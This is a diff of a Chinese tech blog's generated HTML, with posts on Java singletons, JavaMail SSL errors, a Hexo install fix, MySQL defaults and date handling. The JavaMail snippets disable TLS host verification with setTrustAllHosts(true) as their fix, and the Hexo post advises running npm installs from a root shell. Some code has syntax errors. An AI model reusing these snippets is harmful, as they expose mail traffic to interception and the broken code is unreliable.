+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton singleton;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</div><div class="line">                <span class="keyword">if</span> (singleton == <span class="keyword">null</span>) &#123;</div><div class="line">                    singleton = <span class="keyword">new</span> Singleton();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> singleton;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>很显然，第一种代码块是线程不安全的。<br>比如说这种情况，有一个线程调用了getInstance()，但执行到if(singleton==null)这一步时，另一个线程也进入了这个方法，那么便会造成最终创建了两个Singleton实例。<br>而若是第二种代码块，在同步锁中加入第二次验证，就不怕多个线程同时进入方法体导致的多个实例被创建了。</p>
 <p>以上两个方法块俗称懒汉式单例模式，意为调用时再创建实例对象。</p>
 <p>另一种单例模式称为饿汉式单例模式，不同的点在于类装载时便完成了类实例化，以下两种方法块都是饿汉式的表现方法，是一样的。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">     instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</div><div class="line"></div><div class="line"><span class="keyword">static</span> &#123;</div><div class="line">     instance = <span class="keyword">new</span> Singleton();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>最后再推荐个与双重检查一样线程安全的，静态内部类实现的懒汉式单例模式。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> Singleton&#123;&#125;;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyHolder</span></span>&#123;</span><br><span class="line">          <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> LazyHolder.INSTANCE;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Singleton</span><span class="params">()</span></span>&#123;</div><div class="line">     <span class="keyword">private</span> Singleton&#123;&#125;;</div><div class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyHolder</span></span>&#123;</div><div class="line">          <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</div><div class="line">     &#125;</div><div class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">          <span class="keyword">return</span> LazyHolder.INSTANCE;</div><div class="line">     &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>这种方式跟饿汉式方式采用的机制类似，但又有不同。两者都是采用了类装载的机制来保证初始化实例时只有一个线程。不同的地方在饿汉式方式是只要Singleton类被装载就会实例化，没有Lazy-Loading的作用，而静态内部类方式在Singleton类被装载时并不会立即实例化，而是在需要实例化时，调用getInstance方法，才会装载SingletonInstance类，从而完成Singleton的实例化。</p>
 <p>类的静态属性只会在第一次加载类的时候初始化，所以在这里，JVM帮助我们保证了线程的安全性，在类进行初始化时，别的线程是无法进入的。</p>
 
@@ -845,10 +1373,10 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEBUG SMTP: trying to connect to host &quot;xxx.xxx.com&quot;, port 587, isSSL true</span><br><span class="line">send failed... the exception is javax.mail.MessagingException: Could not connect to SMTP host: xxx.xxx.com, port: 587;</span><br><span class="line">  nested exception is:</span><br><span class="line">javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection?</span><br></pre></td></tr></table></figure>
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">DEBUG SMTP: trying to connect to host &quot;xxx.xxx.com&quot;, port 587, isSSL true</div><div class="line">send failed... the exception is javax.mail.MessagingException: Could not connect to SMTP host: xxx.xxx.com, port: 587;</div><div class="line">  nested exception is:</div><div class="line">javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection?</div></pre></td></tr></table></figure>
 <p>如果你遇到了这种报错，而其它办法又解决不了。<br>不妨试试调整properties的put()方法放置顺序吧。<br>起初我也觉得put()顺序并不会影响到后续的其他方法块对它的读取啊。<br>然而当我调转了它们的位置时，不再报错了。。<br>邮件成功的发送出去了。</p>
 <p>这是我放置properties的方法块</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MailSSLSocketFactory mssf = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">  mssf = <span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">  mssf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, mssf);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.port"</span>, <span class="string">"587"</span>);</span><br><span class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory.port"</span>, <span class="string">"587"</span>);</span><br><span class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.class"</span>, <span class="string">"DummySSLSocketFactory"</span>);</span><br><span class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.fallback"</span>, <span class="string">"false"</span>);</span><br><span class="line"><span class="comment">// properties.setProperty("mail.smtp.port", "587");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.smtp.socketFactory.port", "587");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.enable", "true");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.class", "DummySSLSocketFactory");</span></span><br><span class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.fallback", "false");</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> GeneralSecurityException e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">MailSSLSocketFactory mssf = <span class="keyword">null</span>;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">  mssf = <span class="keyword">new</span> MailSSLSocketFactory();</div><div class="line">  mssf.setTrustAllHosts(<span class="keyword">true</span>);</div><div class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, mssf);</div><div class="line">  properties.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</div><div class="line">  properties.put(<span class="string">"mail.smtp.port"</span>, <span class="string">"587"</span>);</div><div class="line">  properties.put(<span class="string">"mail.smtp.ssl.socketFactory.port"</span>, <span class="string">"587"</span>);</div><div class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.class"</span>, <span class="string">"DummySSLSocketFactory"</span>);</div><div class="line">  properties.setProperty(<span class="string">"mail.imap.ssl.socketFactory.fallback"</span>, <span class="string">"false"</span>);</div><div class="line"><span class="comment">// properties.setProperty("mail.smtp.port", "587");</span></div><div class="line"><span class="comment">// properties.setProperty("mail.smtp.socketFactory.port", "587");</span></div><div class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.enable", "true");</span></div><div class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.class", "DummySSLSocketFactory");</span></div><div class="line"><span class="comment">// properties.setProperty("mail.imap.ssl.socketFactory.fallback", "false");</span></div><div class="line">  &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> GeneralSecurityException e) &#123;</div><div class="line">  e.printStackTrace();</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
 <p>而你需要做的便是把</p>
 <blockquote>
 <p>properties.put(“mail.smtp.ssl.enable”, “true”);</p>
@@ -1003,11 +1531,11 @@
         
           
             <p>玩了一下Java Mail，试图使用QQ邮箱作为发送者的邮箱，当然填写在代码中的邮箱密码写的是明文真实密码啦。<br>喜闻乐见的是出现了error 530，这个错误的产生实际上也是腾讯对自己邮箱用户的保护机制啦。其一是谁也不希望自己的产品被克隆。其二是用户异常操作时，找不到操作记录，是不是很扎心？</p>
-<p>于是，兜了一大圈，再回到正题上来。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.mail.AuthenticationFailedException: <span class="number">530</span> Error: <span class="function">A secure connection is <span class="title">requiered</span><span class="params">(such as ssl)</span>. More information at http:<span class="comment">//service.mail.qq.com/cgi-bin/help?id=28</span></span></span><br></pre></td></tr></table></figure></p>
-<p>530报错提示需要一个安全的链接（比如ssl啦stl啦），这里就po一下ssl加密的代码吧。（其实stl也差不多的啦～<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MailSSLSocketFactory sf = <span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">prop.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</span><br><span class="line">prop.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, sf);</span><br></pre></td></tr></table></figure></p>
+<p>于是，兜了一大圈，再回到正题上来。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javax.mail.AuthenticationFailedException: <span class="number">530</span> Error: <span class="function">A secure connection is <span class="title">requiered</span><span class="params">(such as ssl)</span>. More information at http:<span class="comment">//service.mail.qq.com/cgi-bin/help?id=28</span></span></div></pre></td></tr></table></figure></p>
+<p>530报错提示需要一个安全的链接（比如ssl啦stl啦），这里就po一下ssl加密的代码吧。（其实stl也差不多的啦～<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">MailSSLSocketFactory sf = <span class="keyword">new</span> MailSSLSocketFactory();</div><div class="line">sf.setTrustAllHosts(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">prop.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</div><div class="line">prop.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, sf);</div></pre></td></tr></table></figure></p>
 <p>把它加进自己的代码里就阔以啦。<br>当然，邮箱里的POP3/SMTP服务与IMAP/SMTP服务就开起来吧。<br>嗯，还有，为了防止邮箱密码泄漏，腾讯给了每个用户数个登录第三方客户端的授权码，也就是可以当作密码使用的一段16位无序字母组合，那么，玩得开心。</p>
 <blockquote>
-<p>相关链接<br><a href="http://www.runoob.com/java/java-sending-email.html" target="_blank" rel="noopener">关于Java Mail简单粗暴的教程(菜鸟教程)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=371" target="_blank" rel="noopener">如何使用 Foxmail 等软件收发邮件？(腾讯)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=331" target="_blank" rel="noopener">什么是 IMAP，它又是如何设置？(腾讯)</a></p>
+<p>相关链接<br><a href="http://www.runoob.com/java/java-sending-email.html" target="_blank" rel="external">关于Java Mail简单粗暴的教程(菜鸟教程)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=371" target="_blank" rel="external">如何使用 Foxmail 等软件收发邮件？(腾讯)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=331" target="_blank" rel="external">什么是 IMAP，它又是如何设置？(腾讯)</a></p>
 </blockquote>
 
           
@@ -1154,603 +1682,19 @@
         
           <p>将hexo从win迁移到mac时发生了安装错误。</p>
 <p>没有保留报错截图，就从日志文件中截取了关键段落。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5751 error code ELIFECYCLE</span><br><span class="line">5752 error errno 1</span><br><span class="line">5753 error hexo-util@0.6.0 postinstall: `npm run build:highlight`</span><br><span class="line">5753 error Exit status 1</span><br><span class="line">5754 error Failed at the hexo-util@0.6.0 postinstall script.</span><br><span class="line">5754 error This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line">5755 verbose exit [ 1, true ]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">5751 error code ELIFECYCLE</div><div class="line">5752 error errno 1</div><div class="line">5753 error hexo-util@0.6.0 postinstall: `npm run build:highlight`</div><div class="line">5753 error Exit status 1</div><div class="line">5754 error Failed at the hexo-util@0.6.0 postinstall script.</div><div class="line">5754 error This is probably not a problem with npm. There is likely additional logging output above.</div><div class="line">5755 verbose exit [ 1, true ]</div></pre></td></tr></table></figure>
 <p>按照网上的几种解法都没能完成安装</p>
 <blockquote>
 <p>sudo npm install -g hexo-cli</p>
 <p>sudo npm install hexo –no-optional</p>
-<p>sudo npm install -g hexo-cli –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></p>
+<p>sudo npm install -g hexo-cli –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a></p>
 </blockquote>
 <p>最后尝试进入root权限中执行npm命令，即</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line">npm install -g hexo-cli</div></pre></td></tr></table></figure>
 <p>安装成功。<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/06/22/hexo-installation-error-on-mac/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/06/01/github-blog-binding-domain/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Amosannn">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Amosannn">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/01/github-blog-binding-domain/" itemprop="url">给GitHub Pages绑定域名 附namesilo域名优惠券</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-01T19:51:17+08:00">
-                2017-06-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/06/01/github-blog-binding-domain/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/06/01/github-blog-binding-domain/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>在GitHub上托管Hexo博客，访问地址自然是username.github.io，如果想用自己的域名访问这个网址，怎么做呢？<br>本文从域名选购到域名绑定一条龙,给你一个更清晰的操作流程。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/06/01/github-blog-binding-domain/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/05/31/mysql-default-constraint/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Amosannn">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Amosannn">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/05/31/mysql-default-constraint/" itemprop="url">MySQL的default约束用法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-31T22:19:51+08:00">
-                2017-05-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
-                    <span itemprop="name">技术一路走到黑</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/31/mysql-default-constraint/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/31/mysql-default-constraint/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>在sql最基本的curd语句使用熟练后，我开始发现提高数据库的稳定性和易用性需要一些其他的东西，比如<code>constraint</code>(约束)。</p>
-<p>我就一个没经过数据加密的user表演示一下<code>default约束</code>的用法。</p>
-<h2 id="建表语句中使用"><a href="#建表语句中使用" class="headerlink" title="建表语句中使用"></a>建表语句中使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</span><br><span class="line">	<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</span><br><span class="line">	username <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="literal">null</span>,</span><br><span class="line">	<span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</span><br><span class="line">	primary key (id)</span><br><span class="line">) engine=InnoDB default charset=utf8;</span><br></pre></td></tr></table></figure>
-<h2 id="已有表结构？使用alter插入字段"><a href="#已有表结构？使用alter插入字段" class="headerlink" title="已有表结构？使用alter插入字段"></a>已有表结构？使用alter插入字段</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</span><br></pre></td></tr></table></figure>
-<h2 id="有默认值的表如何添加数据"><a href="#有默认值的表如何添加数据" class="headerlink" title="有默认值的表如何添加数据"></a>有默认值的表如何添加数据</h2><p>那么表结构已经有了<code>default约束</code>，在插入值的时候如何处理字段的默认值呢？<br>传入null？空字符串？或者是不填？都不行！<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/31/mysql-default-constraint/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/05/28/java-get-time/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Amosannn">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Amosannn">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/05/28/java-get-time/" itemprop="url">使用Calendar或DateFormat拆分日期</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-28T23:18:28+08:00">
-                2017-05-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
-                    <span itemprop="name">技术一路走到黑</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/28/java-get-time/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/28/java-get-time/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现<code>util.Date类</code>中的获取方法竟然在jdk1.1就过期了…<br>于是按着jdk中推荐的<code>Calendar类</code>摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 使用Calendar实现时间拆解</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public void getTimeByCalendar()&#123;</span></span><br><span class="line"><span class="comment">	Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="comment">	cal.setTime(new Date());//  传入Date对象即可</span></span><br><span class="line"><span class="comment">	int year = cal.get(Calendar.YEAR);// 获取年份</span></span><br><span class="line"><span class="comment">	int month=cal.get(Calendar.MONTH);// 获取月份</span></span><br><span class="line"><span class="comment">	int day=cal.get(Calendar.DATE);// 获取日</span></span><br><span class="line"><span class="comment">	int hour=cal.get(Calendar.HOUR);// 小时</span></span><br><span class="line"><span class="comment">	int minute=cal.get(Calendar.MINUTE);// 分           </span></span><br><span class="line"><span class="comment">	int second=cal.get(Calendar.SECOND);// 秒</span></span><br><span class="line"><span class="comment">	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天</span></span><br><span class="line"><span class="comment">	System.out.println("现在的时间是：公元"+year+"年"+month+"月"+day+"日      "+hour+"时"+minute+"分"+second+"秒       星期"+dayOfWeek);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
